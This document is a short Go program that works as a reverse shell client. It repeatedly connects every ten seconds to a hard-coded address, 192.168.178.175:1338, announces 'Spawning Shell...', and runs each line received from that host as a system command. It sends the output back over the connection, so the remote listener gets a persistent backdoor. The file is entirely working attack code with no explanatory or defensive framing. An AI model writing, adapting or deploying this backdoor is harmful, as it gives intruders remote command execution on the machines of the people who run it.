package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
	"unicode/utf8"
)


func main() {
	var SERVER string = "192.168.178.175:1338"
	var SEPERATOR string = "的"

	for {
		time.Sleep(time.Second*10)


		conn, err := net.Dial("tcp", SERVER)

		if err != nil {
			continue
		}

		conn.Write([]byte("\x1b[32m[+]\x1b[39m Spawning Shell..."+SEPERATOR))
	
		for {
			message, _ := bufio.NewReader(conn).ReadString('\n')

			if len(message) == 0 {
				conn.Close()
				break
			} else if strings.ToLower(message)[0:4] == "exit" {
				conn.Close()
				break
			}

			fout := exec.Command(strings.TrimSuffix(message, "\n"))

			fout.Stdout = nil
			fout.Stderr = nil

			out, err := fout.Output()

			output := bytes.Map(func(r rune) rune {
				if r == utf8.RuneError {
					// Replace unknown UTF characters with 0x3F
					return 0x3F
				}
				return r
			}, out)

			out = output

			if len(out) == 0 {
				out = []byte("NIL"+SEPERATOR)
			}

			if err != nil {
				fmt.Fprintf(conn, "%s"+SEPERATOR, err)
			} else {
				fmt.Fprintf(conn, "%s"+SEPERATOR, out)
			}
		}
	}
}